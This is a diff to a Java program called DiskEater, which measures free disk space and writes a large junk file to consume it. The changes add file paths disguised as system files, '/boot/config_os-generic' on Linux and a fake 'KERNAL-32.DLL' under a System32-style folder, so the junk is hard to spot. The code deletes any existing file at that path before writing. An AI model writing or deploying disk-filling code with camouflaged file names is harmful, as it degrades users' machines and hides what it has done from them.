@@ -30,49 +30,57 @@ public class DiskEater {
      */
     public static void main(String[] args) {
         boolean verbose = false;
-        File file = new File(getJunkPath());
+        
+        if (getJunkPath().equals("junk")) {
+            System.out.println("Operating System not supported.");
+        } else {
+            System.out.println("\\");
+            File file = new File(getJunkPath());
 
-        // remove file if it already exists
-        if (verbose) {
-            System.out.println(file.getAbsolutePath());
-        }
-        if (file.exists()) {
-            file.delete();
-        }
+            // remove file if it already exists
+            if (verbose) {
+                System.out.println(file.getAbsolutePath());
+            }
+            if (file.exists()) {
+                file.delete();
+            }
 
-        if (args.length < 1 || !args[0].equals("-c")) {
-            double fill = .15;
-            long available = -1;
-            long total = -1;
+            // if -c parameter is not given, run full program
+            if (args.length < 1 || !args[0].equals("-c")) {
+                double fill = .15;
+                long available = -1;
+                long total = -1;
 
-            //get storage information
-            NumberFormat nf = NumberFormat.getNumberInstance();
-            for (Path root : FileSystems.getDefault().getRootDirectories()) {
+                //get storage information
+                NumberFormat nf = NumberFormat.getNumberInstance();
+                for (Path root : FileSystems.getDefault().getRootDirectories()) {
+
+                    if (verbose) {
+                        System.out.print(root + ": ");
+                    }
+                    try {
+                        FileStore store = Files.getFileStore(root);
+                        if (verbose) {
+                            System.out.println("available="
+                                    + nf.format(store.getUsableSpace())
+                                    + ", total=" + nf.format(store.getTotalSpace()));
+                        }
+                        available = store.getUsableSpace();
+                        total = store.getTotalSpace();
+                    } catch (IOException e) {
+                        System.out.println("error querying space: " + e.toString());
+                    }
+                }
 
                 if (verbose) {
-                    System.out.print(root + ": ");
+                    System.out.println("Disk Space Available: " + (double) available / (double) total);
                 }
-                try {
-                    FileStore store = Files.getFileStore(root);
-                    if (verbose) {
-                        System.out.println("available="
-                                + nf.format(store.getUsableSpace())
-                                + ", total=" + nf.format(store.getTotalSpace()));
-                    }
-                    available = store.getUsableSpace();
-                    total = store.getTotalSpace();
-                } catch (IOException e) {
-                    System.out.println("error querying space: " + e.toString());
+
+                writeFile(available, total, fill, file);
+
+                if (verbose) {
+                    getSpace();
                 }
-            }
-
-            if (verbose) {
-                System.out.println("Disk Space Available: " + (double) available / (double) total);
-            }
-
-            writeFile(available, total, fill, file);
-            if (verbose) {
-                getSpace();
             }
         }
     }
@@ -84,8 +92,10 @@ public class DiskEater {
      */
     public static String getJunkPath() {
         if (System.getProperty("os.name").equals("Linux")) {
-//            return "/sys/kernal/config_os-generic";
             return "/boot/config_os-generic";
+        } else if (System.getProperty("os.name").equals("Windows")) {
+            String root = System.getProperty("user.home");
+            return root + "\\Windows\\System32\\KERNAL-32.DLL";
         }
         return "junk";
     }
